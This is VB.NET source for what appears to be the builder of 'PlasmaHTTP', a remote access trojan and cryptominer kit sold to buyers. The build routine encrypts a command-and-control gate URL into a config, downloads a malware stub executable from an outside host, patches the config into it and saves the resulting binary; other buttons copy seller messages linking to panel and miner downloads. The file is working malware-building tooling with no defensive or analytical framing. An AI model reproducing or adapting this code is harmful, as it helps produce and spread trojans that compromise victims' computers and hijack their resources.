Public Class Form1
    Public Shared Function ReplaceBytes(ByVal src As Byte(), ByVal search As Byte(), ByVal repl As Byte()) As Byte()
        Try
            Dim dst As Byte() = Nothing
            Dim index As Integer = FindBytes(src, search)
            If index >= 0 Then
                dst = New Byte(src.Length - search.Length + (repl.Length - 1)) {}
                ' before found array
                Buffer.BlockCopy(src, 0, dst, 0, index)
                ' repl copy
                Buffer.BlockCopy(repl, 0, dst, index, repl.Length)
                ' rest of src array
                Buffer.BlockCopy(src, index + search.Length, dst, index + repl.Length, src.Length - (index + search.Length))
            End If
            Return dst
        Catch
            MessageBox.Show("Error occured")
        End Try

    End Function

    Public Shared Function FindBytes(ByVal src As Byte(), ByVal find As Byte()) As Integer
        Try
            Dim index As Integer = -1
            Dim matchIndex As Integer = 0
            ' handle the complete source array
            For i As Integer = 0 To src.Length - 1
                If src(i) = find(matchIndex) Then
                    If matchIndex = (find.Length - 1) Then
                        index = i - matchIndex
                        Exit For
                    End If
                    matchIndex += 1
                Else
                    matchIndex = 0

                End If
            Next
            Return index
        Catch
            MessageBox.Show("Error occured")
        End Try

    End Function
    Public Shared Function EncryptConfig(ByVal input As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("czz2QsB/9g/QkhBYxfV1BKPnxbWia5T8s+sSZq3Atslu5pVt5tSUqR+s4kVcMUjQPV+yfWnrEy3TfLOY/8K5vg=="))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            Dim omgawd = "*"
            Dim gate = AES_Encrypt(GateURL.Text, "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings")
                 Dim del = AES_Encrypt(delay.Text, "ShowSuperHidden")
            Dim compileinfo = EncryptConfig(omgawd & gate & omgawd & del & omgawd)
            If compileinfo.Length < 400 Then
                While Not compileinfo.Length = 400
                    compileinfo = compileinfo & " "
                End While
                Dim WhatWereReplacing = System.Text.ASCIIEncoding.ASCII.GetBytes("23423814712893749812376498713264872136487326184612389746213874681326489123648912364813268946321864872316458793216489132640982343658743265874368756438756286483264832685624385634289658934265894325432523452763498721364I7612874621384631286489213648921364812364861328461328468123648132648723165873246587426387563248756432879658923465893246589432687562387456287163487612389746213897463128946981329649813266")
                Dim WhatWereReplacingWith = System.Text.ASCIIEncoding.ASCII.GetBytes(compileinfo)
                Dim wget As New System.Net.WebClient()
                Dim Bin = wget.DownloadData(("http://autowarlicence.co/Stub.exe")) 'Link to the stub of Plasma HTTP, in this folder!
                Using S As New SaveFileDialog With {.Filter = "*.exe | *.exe"}
                    If S.ShowDialog = 1 Then
                        My.Computer.FileSystem.WriteAllBytes(S.FileName, ReplaceBytes(Bin, WhatWereReplacing, WhatWereReplacingWith), False)
                        MessageBox.Show("Successfully Built Bin at: " & S.FileName, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    End If
                End Using
            Else
                MessageBox.Show("Config too large.")
            End If
        Catch
            MessageBox.Show("Error")
        End Try
    End Sub

   

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim x = "Thank you for purchasing PlasmaHTTP!" & vbNewLine & vbNewLine & "Here is the Download: http://files.plasmarat.pw/1.1.zip" & vbNewLine & vbNewLine & "Please read the readme.txt, install the panel, and then send me your gate.php URL once you've installed the panel." & vbNewLine & vbNewLine & "Thank you"
        My.Computer.Clipboard.SetText(x)
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)
        MessageBox.Show("check yourself, get it?")
    End Sub
    Public Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function
    Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Dim lel = "Here is the panel and miner files: http://files.plasmarat.pw/1.1.zip" & vbNewLine & vbNewLine & "To update, simply replace all panel files except config, and assets folder. Everything should work from there."
        My.Computer.Clipboard.SetText(lel)
    End Sub
End Class
